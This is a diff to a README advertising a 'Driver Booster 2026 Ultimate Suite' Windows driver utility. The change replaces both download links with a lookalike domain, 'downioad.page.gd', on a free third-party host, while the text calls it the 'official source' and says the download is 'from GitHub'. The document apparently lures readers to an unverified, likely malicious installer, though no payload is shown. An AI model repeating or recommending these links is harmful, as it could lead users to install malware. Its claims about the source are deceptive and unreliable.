@@ -2,7 +2,7 @@
 
 This repository provides the Driver Booster 2026 Ultimate Suite, a comprehensive Windows desktop utility designed to simplify driver management and enhance system performance. With advanced scanning technology and user-friendly features, it ensures your hardware components run smoothly with the latest drivers, minimizing errors and boosting stability. The 2026 edition includes refined algorithms and an intuitive interface for an even better experience.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -68,6 +68,6 @@ A: The initial download and installation require internet access, but once insta
 
 To access the Driver Booster 2026 Ultimate Suite, please download it from the official source:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 This link directs you to the secure download page. Always ensure you have a stable connection and follow the installation instructions for optimal results. For any issues or suggestions, consider opening an issue in this repository.
